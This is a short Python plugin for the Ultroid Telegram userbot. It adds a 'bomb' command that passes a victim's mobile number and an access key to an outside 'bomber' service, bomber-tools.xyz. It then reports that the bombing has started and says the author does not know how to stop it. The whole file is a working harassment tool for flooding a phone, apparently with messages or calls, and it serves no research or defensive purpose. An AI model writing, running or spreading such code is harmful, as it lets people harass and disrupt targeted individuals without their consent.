#..setdb bkey bombersmm
from . import udB
import requests
from . import ultroid_cmd
from bs4 import BeautifulSoup
from . import ultroid_cmd, run_async

@run_async
@ultroid_cmd(pattern="bomb(?: |$)(.*)")
async def bomber(e):
    access_key = udB.get_key("bkey")
    if not access_key:
        return await e.eor("bomber access key missing.")

    mobile_number = e.pattern_match.group(1)
    if not mobile_number:
        return await e.eor("Please provide a mobile number.")
    
    url = 'https://bomber-tools.xyz/'
    params = {
        'mobile': mobile_number,
        'accesskey': access_key,
        'submit': 'Submit'
    }
    response = requests.get(url, params=params)
    soup = BeautifulSoup(response.text, 'html.parser')
    message = "bomber started successfully. I don't know how to kill it 😑"
    await e.eor(message)